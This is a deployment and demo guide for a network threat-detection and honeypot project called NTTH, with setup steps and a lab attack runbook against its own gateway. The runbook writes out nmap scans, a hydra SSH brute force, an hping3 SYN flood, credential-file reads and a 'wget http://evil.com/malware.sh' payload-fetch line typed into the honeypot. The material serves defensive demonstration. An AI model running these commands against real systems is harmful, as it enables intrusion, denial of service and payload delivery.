# NTTH Deployment & Demo Guide

## Table of Contents

1. [What We Built (VM Setup)](#1-what-we-built-vm-setup)
2. [Physical Device Deployment](#2-physical-device-deployment)
3. [Demo Attack Runbook](#3-demo-attack-runbook)

---

## 1. What We Built (VM Setup)

### Architecture

```
                        Mobile Hotspot (Internet)
                               │
                        ┌──────┴──────┐
                        │   enp0s3    │ ← Bridged Adapter
                        │ 10.142.204.2│    (DHCP from hotspot)
                        │             │
                        │  UBUNTU VM  │
                        │  (Gateway)  │
                        │             │
                        │   enp0s8    │ ← Internal Network
                        │ 192.168.4.1 │    "ntth_protected"
                        └──────┬──────┘
                               │
               ┌───────────────┼───────────────┐
               │               │               │
        ┌──────┴──────┐ ┌──────┴──────┐ ┌──────┴──────┐
        │  Kali VM    │ │  Victim VM  │ │  Any VM     │
        │ 192.168.4.x │ │ 192.168.4.x │ │ 192.168.4.x │
        │ (attacker)  │ │ (target)    │ │ (monitored) │
        └─────────────┘ └─────────────┘ └─────────────┘

Dashboard access: Any device on hotspot → http://10.142.204.2:8000
```

### What Each Component Does

| Component | Where | Purpose |
|---|---|---|
| **Ubuntu VM (enp0s3)** | Bridged on hotspot | Internet access + Dashboard access from phones/laptops |
| **Ubuntu VM (enp0s8)** | Internal Network `ntth_protected` | Gateway for protected VMs, NTTH monitors ALL traffic here |
| **dnsmasq** | Ubuntu VM | Auto-assigns IPs (192.168.4.2–100) to VMs on protected network |
| **Docker Stack** | Ubuntu VM | Runs backend + PostgreSQL + Cowrie honeypot |
| **nftables** | Ubuntu VM | Blocks/redirects attacker traffic to honeypots |
| **Kali VM** | Internal Network | Simulates attacker — connects via DHCP, attacks other VMs |

### Setup Steps We Followed

#### VirtualBox VM Configuration

1. Created `NTTH-Gateway` VM: 4 GB RAM, 2 CPUs, 40 GB disk
2. **Adapter 1**: Bridged Adapter → host WiFi (mobile hotspot)
3. **Adapter 2**: Internal Network → `ntth_protected`
4. Installed Ubuntu Server 24.04 LTS (with OpenSSH server)

#### Ubuntu Post-Install Commands

```bash
# 1. System update
sudo apt update && sudo apt upgrade -y && sudo apt autoremove -y

# 2. Install dependencies
sudo apt install -y \
  curl wget git unzip net-tools vim htop \
  python3 python3-pip python3-venv \
  nftables iptables-persistent \
  openssh-server postgresql-client \
  dnsmasq nmap tcpdump

# 3. Install Docker (official)
sudo apt install -y ca-certificates curl
sudo install -m 0755 -d /etc/apt/keyrings
sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc
sudo chmod a+r /etc/apt/keyrings/docker.asc
echo \
  "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu \
  $(. /etc/os-release && echo "$VERSION_CODENAME") stable" | \
  sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
sudo apt update
sudo apt install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
sudo usermod -aG docker $USER

# 4. Install Flutter
sudo snap install flutter --classic

# 5. Enable services
sudo systemctl enable docker && sudo systemctl start docker
sudo systemctl enable ssh && sudo systemctl start ssh
sudo systemctl enable nftables && sudo systemctl start nftables
```

#### Network Configuration

```bash
# Netplan (/etc/netplan/50-cloud-init.yaml)
network:
  version: 2
  renderer: networkd
  ethernets:
    enp0s3:
      dhcp4: true
    enp0s8:
      dhcp4: false
      addresses:
        - 192.168.4.1/24

# Apply
sudo netplan apply

# IP forwarding
echo 'net.ipv4.ip_forward=1' | sudo tee -a /etc/sysctl.conf
sudo sysctl -p

# NAT rules
sudo iptables -t nat -A POSTROUTING -o enp0s3 -j MASQUERADE
sudo iptables -A FORWARD -i enp0s3 -o enp0s8 -m state --state RELATED,ESTABLISHED -j ACCEPT
sudo iptables -A FORWARD -i enp0s8 -o enp0s3 -j ACCEPT
sudo netfilter-persistent save

# Fix DNS conflict (systemd-resolved uses port 53)
sudo systemctl stop systemd-resolved
sudo systemctl disable systemd-resolved
sudo rm /etc/resolv.conf
echo -e "nameserver 8.8.8.8\nnameserver 8.8.4.4" | sudo tee /etc/resolv.conf

# DHCP server (/etc/dnsmasq.conf)
interface=enp0s8
dhcp-range=192.168.4.2,192.168.4.100,255.255.255.0,24h
server=8.8.8.8
server=8.8.4.4

# Start DHCP
sudo systemctl enable dnsmasq
sudo systemctl restart dnsmasq

# Fix Docker iptables issue
sudo modprobe ip_tables
sudo modprobe iptable_filter
sudo modprobe iptable_nat
sudo systemctl restart docker
```

#### Deployment

```bash
# Clone repo
cd ~/projects
git clone https://github.com/Sujith1911/NTTH.git
cd NTTH

# Create .env
cd backend
cp .env.example .env
# Edit: NETWORK_INTERFACE=enp0s8, GATEWAY_IP=192.168.4.1, etc.

# Build Flutter web app
cd ../flutter_app
flutter pub get
flutter build web

# Deploy Docker stack
cd ../backend
docker compose up -d --build
```

### Why VM Setup Can't Monitor Physical Devices

VirtualBox Internal Network is a **virtual switch** — only VMs can join it. Physical phones and laptops connect to the mobile hotspot, which is a separate network. Ubuntu's `enp0s3` (bridged) is on the hotspot, but moderns routers/hotspots don't forward traffic between devices to all recipients.

**Result**: Ubuntu only sees traffic addressed to itself on the hotspot, but sees ALL traffic on the Internal Network.

---

## 2. Physical Device Deployment

### What Changes

Instead of VirtualBox, Ubuntu runs on a **physical machine** (laptop, mini-PC, Raspberry Pi 4/5) with a WiFi adapter that supports AP mode. Ubuntu creates its own WiFi — ALL devices connect to it.

### Architecture

```
                    Internet
                    (Ethernet/USB tethering)
                        │
                 ┌──────┴──────┐
                 │    eth0     │ ← Wired internet
                 │             │
                 │  UBUNTU PC  │
                 │  (Gateway)  │
                 │             │
                 │    wlan0    │ ← WiFi Access Point
                 │ 192.168.4.1 │    SSID: "NTTH-Secure"
                 └──────┬──────┘
                        │  ← WiFi signal
        ┌───────────────┼───────────────┐
        │               │               │
   ┌────┴────┐    ┌─────┴─────┐   ┌─────┴──────┐
   │ Phone   │    │  Laptop   │   │  Phone 2   │
   │ Termux  │    │  (Kali)   │   │  (Browser) │
   │ .4.x    │    │  .4.x     │   │  .4.x      │
   └─────────┘    └───────────┘   └────────────┘

   ALL traffic flows through Ubuntu → NTTH sees EVERYTHING ✅
```

### Step-by-Step Physical Setup

#### Prerequisites

- Physical machine with: Ethernet port + WiFi adapter
- Ubuntu Server 24.04 installed
- WiFi that supports AP mode (check: `iw list | grep -A 5 "Supported interface modes"` → must show "AP")

#### 1. Install hostapd (WiFi Access Point)

```bash
sudo apt install -y hostapd

# Create config
sudo nano /etc/hostapd/hostapd.conf
```

```ini
interface=wlan0
driver=nl80211
ssid=NTTH-Secure
hw_mode=g
channel=7
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=NoTimeToHack2026
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
```

> Replace `wlan0` with your WiFi interface name. Change SSID and password to your preference.

```bash
# Point hostapd to config
sudo nano /etc/default/hostapd
# Add: DAEMON_CONF="/etc/hostapd/hostapd.conf"

# Enable and start
sudo systemctl unmask hostapd
sudo systemctl enable hostapd
sudo systemctl start hostapd
```

#### 2. Network Config (Same as VM, but wlan0 instead of enp0s8)

```bash
# Netplan
sudo nano /etc/netplan/01-netcfg.yaml
```

```yaml
network:
  version: 2
  renderer: networkd
  ethernets:
    eth0:
      dhcp4: true
  wifis:
    wlan0:
      dhcp4: false
      addresses:
        - 192.168.4.1/24
```

```bash
sudo netplan apply

# IP forwarding
echo 'net.ipv4.ip_forward=1' | sudo tee -a /etc/sysctl.conf
sudo sysctl -p

# NAT (internet for connected devices)
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
sudo netfilter-persistent save
```

#### 3. DHCP Server (Same as VM)

```bash
sudo nano /etc/dnsmasq.conf
```

```ini
interface=wlan0
dhcp-range=192.168.4.2,192.168.4.100,255.255.255.0,24h
server=8.8.8.8
server=8.8.4.4
```

```bash
sudo systemctl restart dnsmasq
```

#### 4. Deploy NTTH (Same as VM)

```bash
# .env settings
NETWORK_INTERFACE=wlan0
GATEWAY_IP=192.168.4.1
SCAN_SUBNET=192.168.4.0/24

# Deploy
cd ~/projects/NTTH/backend
docker compose up -d --build
```

#### 5. Connect Devices

- Any phone/laptop: Connect to WiFi `NTTH-Secure` (password: `NoTimeToHack2026`)
- Automatically gets IP via DHCP
- All traffic flows through Ubuntu → NTTH monitors everything
- Dashboard: `http://192.168.4.1:8000`

### Physical vs VM Comparison

| Feature | VM Setup | Physical Setup |
|---|---|---|
| **Monitors physical devices** | ❌ Only VMs | ✅ All WiFi clients |
| **Monitors VMs** | ✅ Internal Network | ❌ Need VMs on same WiFi |
| **Setup complexity** | Medium | Medium + need WiFi AP support |
| **Best for** | Demo/testing/viva | Real-world deployment |
| **Attacker source** | Kali VM | Phone (Termux), laptop, any device |
| **Dashboard access** | Any hotspot device | Any WiFi client |

---

## 3. Demo Attack Runbook

### Prerequisites

- Ubuntu VM is running with Docker stack deployed
- Kali VM is created with **Adapter 1 = Internal Network → `ntth_protected`**

### Step A: Start Kali and Verify Connectivity

Boot Kali VM, login, open terminal:

```bash
# Get IP from DHCP
sudo dhclient -v
ip a
# Should show: 192.168.4.x (e.g., 192.168.4.15)

# Test gateway
ping -c 3 192.168.4.1

# Test internet (through Ubuntu NAT)
ping -c 3 8.8.8.8
```

### Step B: Open Dashboard on Your Phone/Laptop

On any device connected to the mobile hotspot, open browser:

```
http://10.142.204.2:8000
```

Login: `admin` / `changeme`

> Keep this open during the attacks — watch it light up in real-time!

### Step C: Attack 1 — Network Discovery (Port Scan)

**On Kali:**
```bash
# Discover all devices on the network
nmap -sn 192.168.4.0/24

# SYN scan the gateway (this WILL trigger port_scan detection)
sudo nmap -sS -Pn -T4 192.168.4.1
```

**What NTTH Does:**
1. Packet sniffer captures each SYN packet
2. Rule engine: 8+ unique ports in 10 seconds → `port_scan` (score = 1.0)
3. ML model: unusual SYN pattern → anomaly score rises
4. Risk: `0.6 × 1.0 + 0.4 × ml_score` = ~0.88
5. Decision: risk ≥ 0.45 → **redirect to honeypot**
6. Enforcement: `nft add rule ... redirect to :30022` (Cowrie)

**What You See on Dashboard:**
- 🔴 Threat count jumps
- Device `192.168.4.15` appears with high risk badge
- Threat type: "port_scan"
- Active firewall rule: redirect

### Step D: Attack 2 — SSH Brute Force

**On Kali:**
```bash
# Simple SSH attempt (gets redirected to Cowrie after the scan above)
ssh root@192.168.4.1
# Enter any password — Cowrie accepts everything!

# Once "inside" Cowrie, type attacker commands:
whoami
uname -a
ls -la
cat /etc/passwd
cat /etc/shadow
pwd
cd /tmp
wget http://evil.com/malware.sh
exit
```

**What NTTH Does:**
1. nftables redirect sends SSH to Cowrie (port 30022)
2. Cowrie accepts login, logs username + password
3. Cowrie records every command typed
4. `cowrie_watcher.py` tails the log in real-time
5. `session_logger.py` saves session to DB + broadcasts via WebSocket

**What You See on Dashboard:**
- Honeypot screen shows new SSH session
- Attacker IP, username tried, password tried
- Full command history visible
- Duration of session

### Step E: Attack 3 — Aggressive Brute Force

**On Kali:**
```bash
# Install hydra if not present
sudo apt install -y hydra

# Brute force SSH (use a small wordlist for demo speed)
echo -e "admin\nroot\nuser\ntest\npassword\n123456\nletmein" > /tmp/passwords.txt
hydra -l root -P /tmp/passwords.txt ssh://192.168.4.1 -t 4 -f -V
```

**What NTTH Does:**
1. Rule engine: 5+ auth-port hits in 60 seconds → `brute_force` (score = 1.0)
2. Risk = 0.95+ → **block** action
3. Enforcement: `nft add rule ... ip saddr 192.168.4.15 drop`
4. Kali loses all connectivity to the gateway

**What You See on Dashboard:**
- Threat type changes to "brute_force"
- Risk score: 0.95+
- Action: "block"
- Firewall screen: active block rule for Kali's IP
- Multiple honeypot sessions with different passwords

### Step F: Attack 4 — HTTP Probing

**On Kali (open new terminal if SSH blocked):**
```bash
# Web scanner / directory brute force
curl -v http://192.168.4.1:8888/admin
curl -v http://192.168.4.1:8888/login
curl -v http://192.168.4.1:8888/wp-admin
curl -v http://192.168.4.1:8888/phpmyadmin
curl -X POST http://192.168.4.1:8888/api/login -d '{"user":"admin","pass":"admin"}'
```

**What NTTH Does:**
1. HTTP honeypot receives each request
2. Responds like a real nginx server: `{"status":"ok"}`
3. Logs method, path, body, headers, source IP
4. Broadcasts `honeypot_session` (type: HTTP) via WebSocket

**What You See on Dashboard:**
- Honeypot screen: HTTP sessions appear
- Method, path, body for each request
- Source IP matches Kali

### Step G: Attack 5 — SYN Flood (DoS)

**On Kali:**
```bash
# SYN flood (use hping3)
sudo apt install -y hping3
sudo hping3 -S --flood -p 80 192.168.4.1
# Let it run for 5-10 seconds, then Ctrl+C
```

**What NTTH Does:**
1. Rule engine: 80+ SYN packets/second → `syn_flood` (score = 1.0)
2. Decision: rate_limit or block depending on risk
3. Enforcement: `nft add rule ... limit rate over 50/second drop`

**What You See on Dashboard:**
- Threat type: "syn_flood"
- Massive packet count spike
- Rate-limit or block rule appears in Firewall screen

### Step H: Verify Everything in the Database

**On Ubuntu (via SSH):**
```bash
# Threat events
docker exec ntth_postgres psql -U ntth_user -d ntth -c \
  "SELECT src_ip, threat_type, risk_score, action_taken, detected_at 
   FROM threat_events ORDER BY detected_at DESC LIMIT 15;"

# Firewall rules
docker exec ntth_postgres psql -U ntth_user -d ntth -c \
  "SELECT target_ip, rule_type, nft_handle, is_active, created_at 
   FROM firewall_rules ORDER BY created_at DESC LIMIT 10;"

# Honeypot sessions
docker exec ntth_postgres psql -U ntth_user -d ntth -c \
  "SELECT attacker_ip, honeypot_type, username_tried, password_tried, 
          commands_run, started_at 
   FROM honeypot_sessions ORDER BY started_at DESC LIMIT 10;"

# Discovered devices
docker exec ntth_postgres psql -U ntth_user -d ntth -c \
  "SELECT ip_address, mac_address, hostname, vendor, risk_score, last_seen 
   FROM devices ORDER BY last_seen DESC LIMIT 10;"
```

### Step I: Reset for Next Demo

```bash
# Remove all firewall rules (so Kali can attack again)
# Option 1: Via Dashboard → System → Emergency Flush
# Option 2: Via API
curl -X POST http://192.168.4.1:8000/api/v1/system/emergency-flush \
  -H "Authorization: Bearer <your-jwt-token>"

# Option 3: Via command line
docker exec ntth_backend python -c "
import asyncio
from app.firewall.nft_manager import NFTManager
asyncio.run(NFTManager().flush_chain())
print('Rules flushed')
"
```

---

## Demo Script Cheat Sheet (Quick Reference)

```
┌─────────────────────────────────────────────────────────────┐
│                    DEMO ORDER (5 minutes)                    │
├──────┬──────────────────────────┬───────────────────────────┤
│ Time │ Kali Command             │ Dashboard Shows           │
├──────┼──────────────────────────┼───────────────────────────┤
│ 0:00 │ nmap -sn 192.168.4.0/24  │ New devices discovered    │
│ 0:30 │ nmap -sS -Pn 192.168.4.1 │ 🔴 port_scan detected    │
│      │                          │ Redirect rule created     │
│ 1:30 │ ssh root@192.168.4.1     │ 🍯 Honeypot session live  │
│      │ (type commands inside)   │ Commands + creds captured │
│ 2:30 │ hydra brute force        │ 🔴 brute_force detected   │
│      │                          │ 🚫 IP blocked             │
│ 3:30 │ curl :8888/admin         │ 🍯 HTTP honeypot hits     │
│ 4:00 │ hping3 SYN flood         │ 🔴 syn_flood detected     │
│      │                          │ Rate-limit rule applied   │
│ 4:30 │ Check DB queries         │ All data persisted ✅     │
└──────┴──────────────────────────┴───────────────────────────┘
```

---

## Talking Points for Viva/Presentation

1. **"How does the AI detect threats?"**
   - Rule engine (3 detectors) + Isolation Forest ML model
   - Weighted: 60% rules + 40% ML
   - Runs on every packet in real-time

2. **"What happens when a threat is detected?"**
   - 4 autonomous agents: Detect → Decide → Enforce → Report
   - Async event bus — zero coupling between agents
   - Action escalation: log → rate_limit → honeypot → block

3. **"Why a honeypot?"**
   - Attacker doesn't know they're being watched
   - Captures credentials, commands, techniques
   - Intelligence gathering, not just blocking

4. **"Can it protect physical devices?"**
   - VM setup: protects other VMs (demo mode)
   - Physical setup: creates WiFi AP, protects ALL connected devices
   - Same code, just different deployment

5. **"Is this real or simulated?"**
   - Real nftables rules on Linux
   - Real Cowrie SSH honeypot (Docker container)
   - Real packet capture via Scapy
   - Also has simulation mode for testing without attacks
